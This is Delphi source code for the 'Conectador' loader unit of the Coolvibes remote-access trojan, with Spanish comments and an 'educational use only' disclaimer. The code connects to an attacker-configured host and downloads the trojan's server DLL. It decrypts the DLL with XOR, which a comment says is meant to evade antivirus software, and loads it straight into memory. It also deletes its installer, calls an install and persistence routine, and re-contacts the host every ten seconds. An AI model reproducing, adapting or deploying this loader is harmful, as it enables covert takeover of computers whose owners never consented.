{Unit principal del Conectador del troyano Coolvibes}
(* Este código fuente se ofrece sólo con fines educativos.
   Queda absolutamente prohibido ejecutarlo en computadores
   cuyo dueño sea una persona diferente de usted, a no ser
   que el dueño haya dado permiso explicito de usarlo.

   En cualquier caso, ni www.indetectables.net  ni ninguno de
   los creadores de Coolvibes será responsable de cualquier
   consecuencia de usar este programa. Si no acepta esto por
   favor no compile el programa y borrelo ahora mismo.

     El equipo Coolvibes
*)

//Config del release
//{$define DevConfig}
//{$define Debug}

//library Conectador; //Descomentar para crear conectador.dll, ésta dll será inyectada por Jeringa.exe en un proceso
program Conectador; //Para no inyectar en ningún proceso

uses
  Windows,
  ShellApi,
  Shfolder,
  WinSock,

  {$ifdef Debug}
    Dialogs,
  {$endif}

  BTMemoryModule in 'BTMemoryModule.pas', //Para cargar una DLL en memoria sin escribir en disco, creditos dentro
  MiniReg in 'MiniReg.pas',
  SettingsDef in 'SettingsDef.pas',
  UnitInstalacion in 'UnitInstalacion.pas',
  Vars in 'Vars.pas';

var
  dllc: string;
  i: Integer;
  MCompartida: THandle;
  ConfigCompartida: PConfigCompartida;
  Indice: string;
  ClaveCifrado1, ClaveCifrado2: Integer; //Claves para cifrar el plugin
  Loaded: Integer;
  TID: Longword;
  EscribirADisco : boolean;

function GetCurrentDirectory: string; //Conseguir dir actual sin sysutils
var
  a: string;
begin
  a := ParamStr(0);
  while Pos('\', a) > 0 do
    begin
      Result := Result + Copy(a, 1, Pos('\', a));
      Delete(a, 1, Pos('\', a));
    end;
end;

function cifrar(Text: AnsiString; i: Integer): AnsiString;
var
  iloop: Integer;
begin
  for iloop := 1 to Length(Text) do
    Text[iloop] := chr(Ord(Text[iloop]) xor i); //Funcion de cifrado simple para evadir antiviruses
  Result := Text;
end;

function readfile(FileName: string): AnsiString; //Leer archivo
var
  f: file;
  buffer: AnsiString;
  Size: Integer;
  defaultfilemode: Byte;
begin
  Result := '';
  defaultfilemode := filemode;
  filemode := 0;
  assignfile(f, FileName);
  reset(f, 1);

  if (ioresult = 0) then
    begin
      Size := filesize(f);

      setlength(buffer, Size);
      blockread(f, buffer[1], Size);
      Result := buffer;

      closefile(f);
    end;

  filemode := defaultfilemode;
end;

procedure loaddll(filecontent: AnsiString); //Funcion para cargar el servidor en memoria
var
  content: string;
  p: Pointer;
  m_DllDataSize: Cardinal;
  CargarServidor: procedure(P: Pointer);
  Module: PBTMemoryModule;
begin
  content := filecontent;
  content := cifrar(content, ClaveCifrado2);   {Descifra el contenido}
  content := cifrar(content, ClaveCifrado1);
  p := @content[1];
  m_DllDataSize := Length(content);

  if (Length(content) > 0) then
    begin
      Module := BTMemoryLoadLibary(p, m_DllDataSize);
      if Module <> nil then
        begin
          CargarServidor := BTMemoryGetProcAddress(Module, 'CargarServidor'); //Para mas indetectabilidad quizas se le deberia cambiar el nombre a la funcion 'CargarServidor'
          CargarServidor(@configuracion); //Se inicia Coolserver.dll y se le manda la configuracion
        end;
    end;

  Loaded := Loaded + 1; //Veces que ha sido cargada
  if (Loaded > 10) then
    begin
      if (fileexists(PChar(dllc))) then
        deletefile(PChar(dllc)); //Falla la carga de la dll mas de 10 veces... la borramos y se la pedimos otra vez al cliente
      Loaded := 0;
    end;
end;

function GetIPFromHost(const HostName: string): string;
type
  TaPInAddr = array[0..10] of PInAddr;
  PaPInAddr = ^TaPInAddr;
var
  phe: PHostEnt;
  pptr: PaPInAddr;
  i: Integer;
begin
  Result := '';
  phe := GetHostByName(PChar(HostName));
  if phe = nil then Exit;
  pPtr := PaPInAddr(phe^.h_addr_list);
  i := 0;
  while pPtr^[i] <> nil do
    begin
      Result := inet_ntoa(pptr^[i]^);
      Inc(i);
    end;
end;

procedure iniciar();
var
  host: string;
  port: Integer;
  wsaData: TWSAData;
  lSocket: TSocket;
  Addr: TSockAddrIn;
  Enviar: string;
  buf: array[0..0] of char;
  desco: Boolean;
  iRecv: Int64;
  ssize: string;
  isize: Int64;
  plugin: file;
  TotalRead: Integer;
  CurrRead: Integer;
  CurrWritten: Integer;
  ArchivoRecibido : Ansistring;
  i : integer;
begin
  desco := False;
  if indice = '' then
    indice := configuracion.shosts;
  host := Copy(indice, 1, Pos(':', indice) - 1);
  Delete(indice, 1, Pos(':', indice));
  Port := StrToInt(Copy(indice, 1, Pos('¬', indice) - 1));
  Delete(indice, 1, Pos('¬', indice));

  if (WSAStartup($0202, wsaData) <> 0) then //Iniciamos winsock
    Exit; //error

  lSocket := Socket(AF_INET, SOCK_STREAM, 0);
  Addr.sin_family := AF_INET;
  Addr.sin_port := htons(Port);
  Addr.sin_addr.S_addr := INET_ADDR(PChar(GetIPFromHost(Host)));

  if (winsock.Connect(lSocket, Addr, SizeOf(Addr)) = 0) then //Intentamos conectar
    begin //Conectados a el cliente

      Enviar := 'GETSERVER|' + IntToStr(clavecifrado1) + '|' + IntToStr(clavecifrado2) + '|' + #10#15#80#66#77#1#72#87;
      Send(lSocket, Enviar[1], Length(Enviar), 0); //Pedimos el tamaño del servidor
      desco := False;
      ZeroMemory(@buf, SizeOf(buf));
      iRecv := Recv(lSocket, buf, SizeOf(buf), 0); //Tenemos que leer el MAININFO
      while (iRecv > 0) do
        begin
          if (iRecv = INVALID_SOCKET) then
            begin
              desco := True;
              break;
            end;

          if (buf[0] = #14) then break;
          ZeroMemory(@buf, SizeOf(buf));
          iRecv := Recv(lSocket, buf, SizeOf(buf), 0);
        end; //Ya hemos recibido el MAININFO, ahora toca intentar recibir el tamaño

      if (desco) then
        begin
          CloseSocket(lSocket);
          Exit; //Nos hemos desconectado
        end;

      ssize := '';
      ZeroMemory(@buf, SizeOf(buf));
      iRecv := Recv(lSocket, buf, SizeOf(buf), 0); //Recibimos el tamaño
      while (iRecv > 0) do
        begin
          if (iRecv = INVALID_SOCKET) then
            begin
              desco := True;
              break;
            end;

          if (buf[0] = #14) then break;
          if (buf[0] <> #10) and (buf[0] <> #13) then
            ssize := ssize + buf[0];
          ZeroMemory(@buf, SizeOf(buf));
          iRecv := Recv(lSocket, buf, SizeOf(buf), 0);
        end;
    end;

  if (desco) then
    begin
      CloseSocket(lSocket);
      Exit; //Nos hemos desconectado
    end;
  isize := StrToInt(ssize); //Ya tenemos el tamaño
  if (isize <> 0) then
    begin
      if(EscribirADisco) then
      begin
        AssignFile(plugin, dllc);
        Rewrite(plugin, 1);
      end
      else
        setlength(ArchivoRecibido, isize);

      Totalread := 0;
      i := 0;
      while (TotalRead < isize) do
        begin
          i := i + 1;
          ZeroMemory(@buf, SizeOf(buf));
          currRead := Recv(lSocket, buf, SizeOf(buf), 0); //GOGOGO
          if (currRead = INVALID_SOCKET) then
            begin
              desco := True;
              break;
            end;
          TotalRead := TotalRead + currRead;
          if(EscribirADisco) then
            BlockWrite(plugin, buf, currRead, currwritten)
          else
            ArchivoRecibido[i] := buf[0];

          currwritten := currRead;
        end;

      if (EscribirADisco) then
        CloseFile(plugin);
    end;

  if (desco) then
    begin
      DeleteFile(PChar(dllc));
      CloseSocket(lSocket);
      Exit; //Nos hemos desconectado
    end;
   CloseSocket(lSocket);
   if not EscribirADisco then {Cargamos el recibido directamente a memoria}
    loaddll(ArchivoRecibido);

   while fileExists(dllc) do
    loaddll(readfile(dllc));
end;

procedure loadsettings();
var
  ConfigLeida: PSettings;
begin
  //Leerlo de la config?
  if ReadSettings(ConfigLeida) = True then //Como no estoy injectado puedo leer la configuracion como siempre
    begin
      {$ifdef Debug}
        ShowMessage('Conectador: ReadSettings OK');
      {$endif}

      Configuracion.sHosts := ConfigLeida^.sHosts;
      Configuracion.sID := ConfigLeida^.sID;
      Configuracion.bCopiarArchivo := ConfigLeida^.bCopiarArchivo;
      Configuracion.sFileNameToCopy := ConfigLeida^.sFileNameToCopy;
      Configuracion.sCopyTo := ConfigLeida^.sCopyTo;
      Configuracion.bCopiarConFechaAnterior := ConfigLeida^.bCopiarConFechaAnterior;
      Configuracion.bMelt := ConfigLeida^.bMelt;
      Configuracion.bArranqueRun := ConfigLeida^.bArranqueRun;
      Configuracion.sRunRegKeyName := ConfigLeida^.sRunRegKeyName;
      Configuracion.bArranqueActiveSetup := ConfigLeida^.bArranqueActiveSetup;
      Configuracion.sActiveSetupKeyName := ConfigLeida^.sActiveSetupKeyName;
      Configuracion.sPluginName := ConfigLeida^.sPluginName;
    end
  else
    begin
      //Estoy corriendo como injectado, así que tengo que leer la configuración escrita por Injector.exe desde memoria
      MCompartida := OpenFileMapping(FILE_MAP_READ, False, 'Config');

      if (MCompartida <> 0) then //Leida con Éxito :D
        begin
          {$ifdef Debug}
            ShowMessage('Conectador: MCompartida OK');
          {$endif}

          ConfigCompartida := MapViewOfFile(Mcompartida, FILE_MAP_READ, 0, 0, 0);
          //Quizás habría que guardar esta configuración cifrada...
          Configuracion.sHosts := ConfigCompartida.sHosts;
          Configuracion.sID := ConfigCompartida.sID;
          Configuracion.bCopiarArchivo := ConfigCompartida.bCopiarArchivo;
          Configuracion.sFileNameToCopy := ConfigCompartida.sFileNameToCopy;
          Configuracion.sCopyTo := ConfigCompartida.sCopyTo;
          Configuracion.bCopiarConFechaAnterior := ConfigCompartida.bCopiarConFechaAnterior;
          Configuracion.bMelt := ConfigCompartida.bMelt;
          Configuracion.bArranqueRun := ConfigCompartida.bArranqueRun;
          Configuracion.sRunRegKeyName := ConfigCompartida.sRunRegKeyName;
          Configuracion.bArranqueActiveSetup := ConfigCompartida.bArranqueActiveSetup;
          Configuracion.sActiveSetupKeyName := ConfigCompartida.sActiveSetupKeyName;
          Configuracion.sPluginName := ConfigCompartida.sPluginName;
          Configuracion.sInyectadorFile := ConfigCompartida.sInyectadorFile;
          UnmapViewOfFile(ConfigCompartida);
          CloseHandle(MCompartida); //La escribimos
        end
      else
        begin
          //Para Debug
          {$ifdef DevConfig}
          Configuracion.sHosts                  := 'localhost:3360¬';
          Configuracion.sID                     := 'Coolserver';
          Configuracion.bCopiarArchivo          := false;
          Configuracion.sFileNameToCopy         := 'coolserver.exe';
          Configuracion.sCopyTo                 := '%AppDir%\';
          Configuracion.bCopiarConFechaAnterior := False;
          Configuracion.bMelt                   := False;
          Configuracion.bArranqueRun            := false;
          Configuracion.sRunRegKeyName          := 'Coolserver';
          Configuracion.bArranqueActiveSetup    := false;
          Configuracion.sActiveSetupKeyName     := 'blah-blah-blah-blah';
          Configuracion.sPluginName             := 'NOESCRIBIRADISCO';
          //Configuracion.sInyectadorFile         := '';
          {$else}
            {$ifdef Debug}
              ShowMessage('Conectador: No config');
            {$endif}

            Exitprocess(0);
          {$endif}
        end;
    end;

  dllc := GetCurrentDirectory+Configuracion.sPluginName;
    EscribirADisco := true;
  if (Configuracion.sPluginName = 'NOESCRIBIRADISCO') then
    EscribirADisco := false;

  ClaveCifrado1 := Ord(Configuracion.shosts[Length(Configuracion.shosts) - (Length(Configuracion.shosts) div 2) + 1]);
  ClaveCifrado2 := Ord(Configuracion.shosts[Length(Configuracion.shosts) - (Length(Configuracion.shosts) div 2)]);
end;

procedure main;
var
  Mut: string;
  Mutex: THandle;
begin
  Mut := Configuracion.sPluginName;
  Mutex := CreateMutex(nil, True, Pchar(Mut));
  if (Mutex = 0) or (GetLastError <> 0) then exitprocess(0);
  while True do
    begin
      while fileExists(dllc) do
        loaddll(readfile(dllc)); {Cargamos la dll desde el archivo si existe}

      iniciar();
      sleep(10000); //Cada 10 segundos
    end;
end;

begin
  if ParamStr(1) = '\melt' then //Esto pasará solamente si no tenemos la opción de inyectar
    begin
      //Borro el archivo de instalación, reintento 5 veces por si las moscas :)
      for i := 1 to 5 do
        begin
          if not FileExists(ParamStr(2)) then
            break
          else
            DeleteFile(PChar(ParamStr(2)));
          Sleep(10);
        end;
    end; //Termina el Melt

  loadsettings(); //Leemos la configuración
  Instalar();
  BeginThread(nil, 0, Addr(Main), nil, 0, TID);
  exitthread(0); //Si tenemos la opción de persistencia activa esto le avisará que hemos leido la configuración
end.

